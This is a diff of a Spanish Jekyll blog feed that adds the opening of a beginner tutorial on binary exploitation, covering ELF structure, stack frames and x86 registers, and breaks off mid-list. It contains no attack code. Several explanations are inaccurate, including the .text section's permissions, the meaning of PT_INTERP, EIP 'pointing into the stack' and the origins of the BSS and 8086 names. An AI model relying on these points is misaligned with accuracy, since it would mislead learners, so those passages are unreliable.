@@ -1,4 +1,431 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-12-22T16:25:59-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">c4rta</title><subtitle>Posts sobre pentesting y otras cosas</subtitle><author><name>c4rta</name></author><entry><title type="html">Explotanto un PRNG bad seed</title><link href="http://localhost:4000/prng-bad-seeds/" rel="alternate" type="text/html" title="Explotanto un PRNG bad seed" /><published>2022-12-12T00:00:00-06:00</published><updated>2022-12-12T00:00:00-06:00</updated><id>http://localhost:4000/prng-bad-seeds</id><content type="html" xml:base="http://localhost:4000/prng-bad-seeds/">&lt;p&gt;Puede ser que conozcas acerca de la generacion de numeros aleatorios, y en caso de que hayas programado en C algo que genere numeros aleatorios, talvez hayas usado la funcion &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rand();&lt;/code&gt;, asi que hoy te voy a mostrar como aprovecharte de esa funcion y de lo que se conoce como una “bad seed” :relaxed:&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-12-23T20:17:31-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">c4rta</title><subtitle>Posts sobre pentesting y otras cosas</subtitle><author><name>c4rta</name></author><entry><title type="html">Introduccion a la explotacion binaria</title><link href="http://localhost:4000/introduccion-pwn/" rel="alternate" type="text/html" title="Introduccion a la explotacion binaria" /><published>2022-12-23T00:00:00-06:00</published><updated>2022-12-23T00:00:00-06:00</updated><id>http://localhost:4000/introduccion-pwn</id><content type="html" xml:base="http://localhost:4000/introduccion-pwn/">&lt;p&gt;Creo que debi de hacer este post antes de los demas pero pues se me olvido jiji, asi que ahora te voy a dar una pequeña introduccion sobre algunos temas que considero, son relevantes para iniciar en la explotacion binaria, o mas que nada antes de explotar tu primer buffer overflow stack based, lo que voy abordar es lo siguiente:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Estructura de un binario ELF
+    &lt;ul&gt;
+      &lt;li&gt;1.1. ¿Que es ELF?&lt;/li&gt;
+      &lt;li&gt;1.2. Encabezado del ELF&lt;/li&gt;
+      &lt;li&gt;1.3. Tabla de encabezado de un programa&lt;/li&gt;
+      &lt;li&gt;1.4. Seccion .text&lt;/li&gt;
+      &lt;li&gt;1.5. Seccion .data&lt;/li&gt;
+      &lt;li&gt;1.6. Seccion .rodata&lt;/li&gt;
+      &lt;li&gt;1.7. Seccion .bss&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Stack de un programa en C
+    &lt;ul&gt;
+      &lt;li&gt;2.1. Stack&lt;/li&gt;
+      &lt;li&gt;2.2. Stack frame&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Lenguaje ensamblador
+    &lt;ul&gt;
+      &lt;li&gt;3.1. Organizacion y arquitectura&lt;/li&gt;
+      &lt;li&gt;3.2. Un poco de historia de x86&lt;/li&gt;
+      &lt;li&gt;3.3. x86 y x86_64 ISA&lt;/li&gt;
+      &lt;li&gt;3.4. Sintaxis AT&amp;amp;T e Intel&lt;/li&gt;
+      &lt;li&gt;3.5. Tipos de datos&lt;/li&gt;
+      &lt;li&gt;3.6. Instrucciones aritméticas y lógicas&lt;/li&gt;
+      &lt;li&gt;3.7. Instrucciones de flujo de datos&lt;/li&gt;
+      &lt;li&gt;3.8. Instrucciones de flujo de control&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Tu primer reversing :heartbeat:
+    &lt;ul&gt;
+      &lt;li&gt;4.1. HackTheBox: You Cant C Me&lt;/li&gt;
+      &lt;li&gt;4.2. HackTheBox: Baby RE&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Asi que es hora de comenzar la aventura!! ^^&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;1-estructura-de-un-binario-elf&quot;&gt;1. Estructura de un binario ELF&lt;/h2&gt;
+
+&lt;h3 id=&quot;11-que-es-elf&quot;&gt;1.1 ¿Que es ELF?&lt;/h3&gt;
+
+&lt;p&gt;Las siglas en español significan “Formato ejetutable enlazado”. Este es un tipo de formato de archivos ejecutables, archivo de objeto/archivo reubicable u objeto compartido, la mayoria de los sistemas *NIX usan este formato de archivo binario, por mencionar algunos ejemplos pueden ser:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;Archivo ejecutable&lt;/strong&gt;: Imagina un archivo ejecutable cualquiera, por ejemplo, el ejecutable de un programa en C, este puede ser ejecutado por el sistema operativo. Se genera mediante la vinculacion de uno o mas archivos de objetos los cuales podrian estar usando Dynamic linking para acceder a las funciones de otros archivos de objetos compartidos, y este archivo contiene el punto de entrada del programa&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;Objeto/archivo reubicable&lt;/strong&gt;: Este contiene el codigo maquina equivalente a un archivo fuente en C, pero aun no se ha vinculado para generar el ejecutable&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;Bibliotecas compartidas&lt;/strong&gt;: Tambien se les conoce como archivo de “objeto vinculado dinamicamente”, esto es por que contiene codigo maquina que se reubica dinamicamente y se ejecuta&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;12-encabezado-del-elf&quot;&gt;1.2 Encabezado del ELF&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/introduccion/elf.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Esta mega imagen (fue la primera que salio en google jeje), es la estructura basica de un archivo ELF.&lt;/p&gt;
+
+&lt;p&gt;Primeramente tenemos le encabezado ELF (ELF header), esta esta presente en todos los archivos ELF, comienza desde el byte 0 hasta el 32, es decir que tiene una longitud de 32 bytes (si hablamos de una arquitectura x64 entonces tiene una longitud de 64 bytes), y mas que nada el ELF header describe la organizacion del archivo, asi como identifica el formato del archivo. Y te lo voy a demostrar ^^&lt;/p&gt;
+
+&lt;p&gt;Abre tu terminal e ingresa este comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readelf -h /usr/bin/whoami&lt;/code&gt;, esto nos servira para mostrar el encabezado ELF del binario “whoami” y te debio de dar algo como esto:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ELF Header:
+  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 
+  Class:                             ELF64
+  Data:                              2's complement, little endian
+  Version:                           1 (current)
+  OS/ABI:                            UNIX - System V
+  ABI Version:                       0
+  Type:                              DYN (Position-Independent Executable file)
+  Machine:                           Advanced Micro Devices X86-64
+  Version:                           0x1
+  Entry point address:               0x2240
+  Start of program headers:          64 (bytes into file)
+  Start of section headers:          29104 (bytes into file)
+  Flags:                             0x0
+  Size of this header:               64 (bytes)
+  Size of program headers:           56 (bytes)
+  Number of program headers:         13
+  Size of section headers:           64 (bytes)
+  Number of section headers:         26
+  Section header string table index: 25
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;numero-magico-magic---primeros-4-bytes&quot;&gt;Numero Magico (Magic) - primeros 4 bytes&lt;/h3&gt;
+
+&lt;p&gt;La magia de los ELF… En nuestro ejemplo podemos ver una linea como esta&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  Magic:   7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Este numero magico que esta en hexadecimal, son los primeros 4 bytes que corresponden a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x7f, E, L, F&lt;/code&gt;. ¿Y por que?, por que es la traduccion de ELF del hexadecimal&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;E = 45
+L = 4c
+F = 46 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;El &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;7f&lt;/code&gt; simplemente es un prefijo. Entonces podemos decir que el numero magico (Magic) son esos valores identifica el formato ELF de un binario.&lt;/p&gt;
+
+&lt;h3 id=&quot;clase---byte-5&quot;&gt;Clase - Byte 5&lt;/h3&gt;
+
+&lt;p&gt;El byte numero 5, este especifica la clase del binario, osea si el binario ELF es de 32 bits o de 64 bits, en mi ejemplo sale algo como esto&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Class:                             ELF64
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Asi que el binario es de 64 bits :)&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;A tomar en cuenta&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Si no es de 32 bits o de 64 bits entonces mostrara algo como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ELFCLASSNONE&lt;/code&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Los binarios de 32 bits utilizan registros de 32 bits y los binarios de 64 bits utilizan registros de 64 bits&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;En una compu de 64 bits, se puede ejecutar un binario de 32 bits porque un sistema operativo de 64 bits está hecho para emular un procesador de 32 bits usando el procesador subyacente de 64 bits cuando se ejecuta un binario de 32 bits. Pero el reves no se puede&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;codificacion-de-datos-o-data---bytes-6&quot;&gt;Codificacion de datos o Data - Bytes 6&lt;/h3&gt;
+
+&lt;p&gt;Existen dos formas de codificar datos, en little endian y big endian, basicamente es la forma en la que se ordenan los bytes en la memoria (esto es un tema mas extenso asi que te recomiento buscar por tu cuenta acerca de “Endianess” :heartbeat: ), en nuestro ejemplo sale algo como&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Data:                              2's complement, little endian
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Y nos dice que nuestro binario usa little endian, entonces podemos decir que “Data” se refiere a la manera en la que estan codificados los datos&lt;/p&gt;
+
+&lt;h3 id=&quot;version-elf---byte-7&quot;&gt;Version ELF - byte 7&lt;/h3&gt;
+
+&lt;p&gt;Se refiere al numero de version… Y pues solo existe &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;01&lt;/code&gt;, solo hay una version y es esa, nada importante la verdad jajaj&lt;/p&gt;
+
+&lt;h3 id=&quot;abi&quot;&gt;ABI&lt;/h3&gt;
+
+&lt;p&gt;Aplicacion de interfaz binaria (ABI), estas son reglas que son seguidas por el compilador y enlazador el generar el ejecutable, como por ejemplo: la convencion de llamadas a funciones en los binarios de intel de 32 y 64 bits es diferente, eso quiere decir que estan usando diferentes ABI. En nuestro ejemplo sale algo como esto&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;OS/ABI:                            UNIX - System V
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Y vemos que el sistema operativo es UNIX, entonces podemos decir que ABI, es la codificacion del sistema operativo y la ABI usada para contruir este ejecutable&lt;/p&gt;
+
+&lt;h3 id=&quot;13-tabla-de-encabezado-de-un-programa&quot;&gt;1.3. Tabla de encabezado de un programa&lt;/h3&gt;
+
+&lt;p&gt;Antes que anda hay que ver por que se llama “Tabla de encabezados de un programa”.
+Cada encabezado de un programa describe un segmento dentro de el, y cada segmento es una pieza importante del programa. Para mostrar los segmentos de un binario ingresa el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;readelf -l /usr/bin/whoami&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos como nos dice que hay 13 encabezados del programa. Quiero destacar 2 cosas, donde dice “Flags” y “Aling”.&lt;/p&gt;
+
+&lt;p&gt;Aling almacena un valor de como se alinean los segmentos en la memoria de un binario en tiempo de ejecucion&lt;/p&gt;
+
+&lt;p&gt;Y las flags, que se refieren a los permisos del segmento, aca te dejo una lista de cada uno (Referencia por Oracle)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/introduccion/flags.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y el significado de cada tipo de encabezado que muestra nuestro ejemplo, es:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;PH_PHDR&lt;/strong&gt;: Especifica la ubicacion y tamaño de la tabla de cabeceras del programa, ese encabezado es unico, es decir que no puede ocurrir dos veces en un mismo programa&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;PT_INTERP&lt;/strong&gt;: Especifica un segmento que es cargable, es decir que los bytes de el archivo se asignan al principio del segmento de memoria&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;PT_DYNAMIC&lt;/strong&gt;: Especifica la informacion del enlace dinamico (otro tema bastante extenso, te recomiendo buscar en google “dynamic linking elf”)&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;PT_NOTE&lt;/strong&gt;: Especifica la ubicacion y tamaño de la informacion extra del binario, alguna de esta informacion es creada por el mismo programador&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;GNU_EH_FRAME&lt;/strong&gt;: Se refiera a una zona usada por gcc, la cual almacena controladores de excepciones, asi que cuando algo sale mal, puede usar esta area para tratarlo&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;GNU_STACK&lt;/strong&gt;: Se usa para almacenar informacion acerca de la pila o stack (ya veremos esto mas adelante)&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;14-seccion-text&quot;&gt;1.4. Seccion .text&lt;/h3&gt;
+
+&lt;p&gt;Contiene el codigo del ejecutable, este empaquetara en un segmento con permisos de luctura y escritura. Solo se hace una vez ya que el contenido no cambiara&lt;/p&gt;
+
+&lt;h3 id=&quot;15-seccion-data&quot;&gt;1.5. Seccion .data&lt;/h3&gt;
+
+&lt;p&gt;Esta seccion contiene variables inicializadas globalmente (nada mas que agregar jeje)&lt;/p&gt;
+
+&lt;h3 id=&quot;16-seccion-rodata&quot;&gt;1.6. Seccion .rodata&lt;/h3&gt;
+
+&lt;p&gt;Lo mismo que .data pero los datos solo tienen permisos de solo lectura&lt;/p&gt;
+
+&lt;h3 id=&quot;17-seccion-bss&quot;&gt;1.7 Seccion .bss&lt;/h3&gt;
+
+&lt;p&gt;Esta contiene todas las variables globales no inicializadas.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Dato extra&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Segun lo que he leido y hasta donde se, BSS se conoce como “Better save space”, y esto es por que en el archivo de objeto, el nombre y tamaño de una variable no se le da memoria real hasta que se usan.&lt;/p&gt;
+
+&lt;h2 id=&quot;2-stack-de-un-programa-en-c&quot;&gt;2. Stack de un programa en C&lt;/h2&gt;
+
+&lt;h3 id=&quot;21-stack&quot;&gt;2.1 Stack&lt;/h3&gt;
+
+&lt;p&gt;El stack o pila en español, es una estructura de datos y un area de la memoria de un programa en C, donde se almacenan valores de registros de manera temporal, variables locales, parametros de funciones y direccion de retorno&lt;/p&gt;
+
+&lt;p&gt;Los limites de la pila de registran mediante los registros EBP y ESP&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;EBP: Puntero base, y apunta al fondo de la pila&lt;/li&gt;
+  &lt;li&gt;ESP: Puntero de la pila, y apunta a la parte superior de la pila&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;22-stack-frame&quot;&gt;2.2 Stack frame&lt;/h3&gt;
+
+&lt;p&gt;El stack frame o marco de la pila, es una parte del stack que esta dedicada a una funcion, por ejemplo, tenemos este codigo en C&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;func_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;func_2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]){&lt;/span&gt;
+  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;resultado&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;n&quot;&gt;resultado&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;func_1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Nuestros stack frame quedan asi&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;|------------------------|
+|  stack frame de main   |
+|------------------------|
+|  stack frame de func_1 |
+|------------------------|
+|  stack frame de func_2 |
+|------------------------|
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;A tomar en cuenta:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;El stack en un programa en C crece hacia abajo, es decir hacia las direccion de memoria mas bajas.&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;La direccion que se almacena en ESP cambian constantemente a medida que los elementos del stack entran o salen, asi que siempre apunta al ultimo elemento&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;El EBP apunta a una ubicacion fija dentro del stack frame de la funcion que se este ejecutando actualmente, y este sirve como punto de referencia para acceder a argumentos y variables locales&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Si quieres ver mas informacion puedes consultar&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;a href=&quot;https://courses.engr.illinois.edu/cs225/fa2022/resources/stack-heap/&quot;&gt;https://courses.engr.illinois.edu/cs225/fa2022/resources/stack-heap/&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;a href=&quot;https://hackthedeveloper.com/memory-layout-c-program/&quot;&gt;https://hackthedeveloper.com/memory-layout-c-program/&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;a href=&quot;https://www.recurse.com/blog/7-understanding-c-by-learningassembly&quot;&gt;https://www.recurse.com/blog/7-understanding-c-by-learningassembly&lt;/a&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;3-lenguaje-ensamblador&quot;&gt;3. Lenguaje ensamblador&lt;/h2&gt;
+
+&lt;h3 id=&quot;31-organizacion-y-arquitectura&quot;&gt;3.1 Organizacion y arquitectura&lt;/h3&gt;
+
+&lt;p&gt;&lt;strong&gt;Arquitectura&lt;/strong&gt;: Es la interfaz de hardware-software para ayudar a los desarrolladores a programar el hardware/procesador, es la forma en la que se puede abordar la memoria, los tipos de datos, etc&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Organizacion&lt;/strong&gt;: Esta basicamente es como se implementa una instruccion en particular o una tecnica de direccionamiento a nivel de hardware&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;La arquitectura se trata de decirle al programador sobre la presencia de una instruccion como por ejemplo “MOV”. Pero la organizacion se ocupa del diseño del hardware interno utilizado para diseñar esa intruccion&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;En los procesadores Intel y AMD, la arquitectura es la misma, lo que significa que las instrucciones son las mismas, pero a nivel de Hardware, puede haber diferencias.&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;32-un-poco-de-historia-de-x86&quot;&gt;3.2 Un poco de historia de x86&lt;/h3&gt;
+
+&lt;p&gt;(Realmente esta parte es irrelevante para la explotacion binaria pero pues se me hace interesante mencionarla asi que si quieres leerla esta bien :heartbeat: )&lt;/p&gt;
+
+&lt;p&gt;Esto se remonta a cuando Intel lanza uno de los primeros procesadores de Intel, era el intel 4004, era un procesador de 4 bits. A lo largo de los años saca el procesador intel 8080, un procesador de 8 bits, este para su epoca ya era una cosa maravillosa, funcionaba con un frecuencia de reloj de 2 MHz, tenia un bus de direccion de 16 bits, entonces manejaba hasta 64 kb de memoria. Despues salio el increible intel 8086, el cual ya era un procesador de 16 bits, y se llamaba 8086 por que intel proporciono un conjunto de intrucciones para usar un microprocesador de 16 bits (El 6 de 8086 viene de el 6 de 16 bits jajaj)&lt;/p&gt;
+
+&lt;p&gt;El chiste es que 8086 tenia un conjunto de 16 bits. Y cuando intel introdujo los microprocesadores de 32 bits, ellos crearon un conjunto de intrucciones de 32 bits, pero en realidad era un extension del antiguo conjunto de intrucciones de 16 bits&lt;/p&gt;
+
+&lt;h3 id=&quot;33-x86-y-x86_64-isa&quot;&gt;3.3 x86 y x86_64 ISA&lt;/h3&gt;
+
+&lt;p&gt;Antes que nada hay que definir que es un registro&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Registro&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Es un pequeño espacio de almacenamiento en el chip del microprocesador, y pues como esta presente en el chip, el tiempo de acceso (tiempo que tarda el procesador en leer/escribir datos almacenados en un registro en especial), es inferior&lt;/p&gt;
+
+&lt;p&gt;Una arquitectura x86 proporciona 8 registros con un tamaño de 32 bits o 4 bytes, estos son:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;EAX&lt;/strong&gt;: Donde la a significa acumulador, y entonces es un registro que se utiliza para almacenar los resultados de algunas operaciones, como por ejemplo del valor de retorno de una funcion&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;ECX&lt;/strong&gt;: Donde la c significa contador, asi que generalmente se usa como contador en bucles&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;EDX&lt;/strong&gt;: Este es muy general, realmente se usa para almacenar todo tipo de datos&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;EBX&lt;/strong&gt;: Donde la b representa la base, asi que puede almacenar un valor base para una operacion en particular&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;ESI&lt;/strong&gt;: Registro fuente, usando para operaciones de strings&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;EDI&lt;/strong&gt;: Registro destino, usado para operaciones de strings&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;&lt;strong&gt;EBP y ESP&lt;/strong&gt;: estos los mencione en la parte del stack, asi que no veo necesidad de hacerlo otra vez jeje&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Todos estos registro se conocen como registros de proposito general (GPR), aun que EBP y ESP si tiene un propisito, junto a estos tambien hay un registro de proposito especial que es EIP, o instruction pointer, este apunta a la siguiente direccion a ejecutar en el stack&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;p&gt;Cuando los procesadores de 8 bits entraron en el mercado, los nombres de los registros eran a, b, c, d&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Cuando llegaron los de 16 bits se renombraron a ax, bx, cx, dx, donde la x significa extendidos&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Cuando llegaron los de 32 bits se cambian a eax, ebx, ecx, edx, donde la x significa extendidos&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;Y por ultimo cuando llegan los de 64 bits, cambian a rax, rbx, rcx, rdx, donde la r significa registro&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;eflags&quot;&gt;eflags&lt;/h3&gt;
+
+&lt;p&gt;Las eflags son un conjunto de estados de bits, donde cada indicador tiene un valor de 0 (borrado o no establecido) o 1 (establecido). Las banderas mas importantes son:&lt;/p&gt;
+
+&lt;ul&gt;
